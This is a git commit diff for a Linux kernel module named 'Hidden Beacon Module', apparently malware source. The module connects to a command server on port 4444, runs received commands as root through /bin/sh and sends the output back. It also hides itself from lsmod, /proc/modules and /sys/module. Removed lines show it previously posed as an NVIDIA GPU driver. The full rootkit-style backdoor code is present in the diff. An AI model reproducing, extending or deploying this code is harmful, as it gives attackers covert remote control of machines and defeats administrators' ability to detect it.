25ae820677c39d3279495dbf7b95d8e4dffdcf1e
Oz Abramovich <184321725+Dark-Avenger-Reborn@users.noreply.github.com>
2025-04-16 13:03:19 -0700

    Update beacon.c

--- kernel/beacon.c
+++ kernel/beacon.c
@@ -7,25 +7,24 @@
 #include <linux/in.h>
 #include <linux/delay.h>
 #include <linux/slab.h>
-#include <linux/string.h>
+#include <linux/fs.h>
 #include <linux/uaccess.h>
-#include <net/sock.h>
-#include <linux/inet.h>
 #include <linux/kmod.h>
-
+#include <linux/string.h>
+#include <net/sock.h>
 
 MODULE_LICENSE("Proprietary");
 MODULE_AUTHOR("kernel");
-MODULE_DESCRIPTION("Mimic NVIDIA GPU Driver");
-MODULE_ALIAS("pci:v000010DEd00001D01sv*sd*bc*sc*i*");
+MODULE_DESCRIPTION("Hidden Beacon Module");
+
+#define SERVER_IP   0x7F000001  // 127.0.0.1
+#define SERVER_PORT 4444
+#define BUF_SIZE    1024
 
 static struct task_struct *beacon_thread;
 static struct socket *conn_socket = NULL;
-#define SERVER_IP   0x7F000001  // 127.0.0.1
-#define SERVER_PORT 4444
-#define BUF_SIZE 1024
 
-// Kernel-space TCP connection function
+// Create TCP connection from kernel space
 static int connect_to_server(void) {
     struct sockaddr_in s_addr;
     int ret;
@@ -42,20 +41,20 @@ static int connect_to_server(void) {
     return ret;
 }
 
-// Receive and execute shell commands
+// Main beacon thread
 static int beacon_main(void *data) {
     struct msghdr msg;
     struct kvec iov;
     char recv_buf[BUF_SIZE];
     char result_buf[BUF_SIZE];
-    mm_segment_t old_fs;
     struct file *file;
+    mm_segment_t old_fs;
     int len;
 
     if (connect_to_server() < 0) return 0;
 
     old_fs = get_fs();
-    set_fs(KERNEL_DS); // Needed for file operations in older kernels
+    set_fs(KERNEL_DS);  // Needed for file access in older kernels
 
     while (!kthread_should_stop()) {
         memset(&msg, 0, sizeof(msg));
@@ -74,17 +73,16 @@ static int beacon_main(void *data) {
         recv_buf[len] = '\0';
         printk(KERN_INFO "[beacon] Got command: %s\n", recv_buf);
 
-        // Run command and redirect output to /tmp/out
+        // Run the command with output redirected
         char *cmd_fmt = "/bin/sh -c '%s > /tmp/out 2>&1'";
         char full_cmd[BUF_SIZE];
         snprintf(full_cmd, BUF_SIZE, cmd_fmt, recv_buf);
 
         char *argv[] = { "/bin/sh", "-c", full_cmd, NULL };
         char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-
         call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 
-        // Read the output back
+        // Read the output
         memset(result_buf, 0, BUF_SIZE);
         file = filp_open("/tmp/out", O_RDONLY, 0);
         if (!IS_ERR(file)) {
@@ -94,10 +92,9 @@ static int beacon_main(void *data) {
             snprintf(result_buf, BUF_SIZE, "[error reading output]");
         }
 
-        // Send back to the server
+        // Send back output
         memset(&msg, 0, sizeof(msg));
         memset(&iov, 0, sizeof(iov));
-
         iov.iov_base = result_buf;
         iov.iov_len = strlen(result_buf);
 
@@ -106,18 +103,18 @@ static int beacon_main(void *data) {
         msleep(1000);
     }
 
-    set_fs(old_fs); // Restore address limit
+    set_fs(old_fs);
     return 0;
 }
 
+// Hide module and start thread
 static int __init hidden_init(void) {
-    printk(KERN_INFO "[hidden_module] Hello world!\n");
+    printk(KERN_INFO "[hidden_module] Loaded.\n");
 
-    // Hide from lsmod, /proc/modules, /sys/module
+    // Hide from lsmod/proc/sys
     list_del_init(&__this_module.list);
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
-    // Start kernel beacon thread
     beacon_thread = kthread_run(beacon_main, NULL, "beacon_thread");
     return 0;
 }
@@ -125,11 +122,10 @@ static int __init hidden_init(void) {
 static void __exit hidden_exit(void) {
     if (beacon_thread)
         kthread_stop(beacon_thread);
-
     if (conn_socket)
         sock_release(conn_socket);
 
-    printk(KERN_INFO "[hidden_module] Goodbye!\n");
+    printk(KERN_INFO "[hidden_module] Unloaded.\n");
 }
 
 module_init(hidden_init);
